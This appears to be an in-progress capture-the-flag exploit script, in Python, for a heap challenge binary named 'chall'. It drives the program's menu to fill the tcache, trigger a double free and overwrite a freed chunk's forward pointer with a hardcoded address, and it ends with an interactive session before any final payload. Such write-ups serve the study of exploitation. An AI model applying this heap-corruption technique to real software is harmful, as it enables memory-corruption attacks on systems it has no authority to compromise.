#!/usr/bin/python3
from rootkit import *

def add(size, data):
	p.recvuntil(b'Choice')
	p.sendline(b'1')
	p.recvuntil(b"length")
	p.sendline(size)
	p.recvuntil(b"data")
	p.send(data)

def link(node1, node2):
	p.recvuntil(b'Choice')
	p.sendline(b'3')
	p.recvuntil(b"index")
	p.sendline(node1)
	p.recvuntil(b"index")
	p.sendline(node2)

def unlink(index, offset, keep):
	p.recvuntil(b'Choice')
	p.sendline(b'4')
	p.recvuntil(b"index")
	p.sendline(index)
	p.recvuntil(b"Enter offset")
	p.sendline(offset)
	p.recvuntil(b'keep')
	p.sendline(keep)

def remove(index, offset):
	p.recvuntil(b'Choice')
	p.sendline(b'2')
	p.recvuntil(b"index")
	p.sendline(index)
	p.recvuntil(b"Which")
	p.sendline(offset)

local_bin = "./chall"
elf = ELF(local_bin)
rop = ROP(elf)

p = gdb.debug(local_bin, '''
	#b *0x555555555746	
	# b *0x55555555595E
	# b *0x555555555CE5
	#b *0x555555555AAC
	continue
	''')

add(b'24', b'z' * 0x18)	# node 0
add(b'24', b'z' * 0x18)	# node 1
add(b'24', b'z' * 0x18)	# node 2
add(b'24', b'z' * 0x18)	# node 3
add(b'24', b'z' * 0x18)	# node 4

add(b'24', b'a' * 0x18)	# node 5
add(b'24', b'b' * 0x18)	# node 6
add(b'24', b'c' * 0x18)	# node 7

remove(b'0', b'1337')			#this will fill the tcache
remove(b'1', b'1337')
remove(b'2', b'1337')
remove(b'3', b'1337')

#p.interactive()
#### tcachebins filled

#add(b'24', b'a' * 0x18)	# node 0
#add(b'24', b'b' * 0x18)	# node 1
#add(b'24', b'c' * 0x18)	# node 1

link(b'5', b'6')
link(b'5', b'7')

# unlink node b, will be written into node 1
unlink(b'5', b'2', b'y') 

# free all, remove node b and node c
#p.interactive()
remove(b'0', b'1337')	

print("[+] Now go to unlink and opt not to keep node eeeee will trigger a double free")

# unlink node 4 and free it so that we avoid double free detection in fastbin
remove(b'4', b'1337')

unlink(b'5', b'2', b'n')
# use all the tcache
for i in range(7):
	add(b'60', 'A'*59)

GUESS = "\x00\xc0" #on_remote
# overwrite fd
add(b'24', p64(0x55555555c000)) #onlocal NOASLR
# overwrite tcache per thread
add(b'24', 'A'*24)
p.interactive()

